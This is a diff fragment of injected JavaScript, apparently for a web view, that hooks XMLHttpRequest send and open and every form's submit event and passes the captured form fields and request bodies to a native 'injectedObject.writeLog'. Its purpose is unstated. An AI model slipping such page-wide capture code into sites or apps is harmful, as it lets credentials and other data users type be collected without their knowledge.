@@ -10,7 +10,7 @@ function parseForm(event) {
         };
     }
     injectedObject.writeLog(data);
-}
+};
 
 function parseAjaxData(data) {
     ajaxReq += ' [Data] ';
@@ -20,13 +20,15 @@ function parseAjaxData(data) {
     };
     injectedObject.writeLog(ajaxReq);
     ajaxReq = '';
-}
-
-var test = XMLHttpRequest.prototype.send;
-XMLHttpRequest.prototype.send = function(data){
-    parseAjaxData(data);
-    test(data);
 };
+
+
+XMLHttpRequest.prototype.realSend = XMLHttpRequest.prototype.send;
+var newSend = function(data){
+    parseAjaxData(data);
+    this.realSend(data);
+};
+XMLHttpRequest.prototype.send = newSend;
 
 var ajaxReq = '';
 var reqOpen = XMLHttpRequest.prototype.open;
@@ -36,5 +38,6 @@ XMLHttpRequest.prototype.open = function(){
     return reqOpen.apply(this, [].slice.call(arguments));
 };
 
-for (var form_idx = 0; form_idx < document.forms.length; ++form_idx)
+for (var form_idx = 0; form_idx < document.forms.length; ++form_idx){
     document.forms[form_idx].addEventListener('submit', parseForm, true);
+}
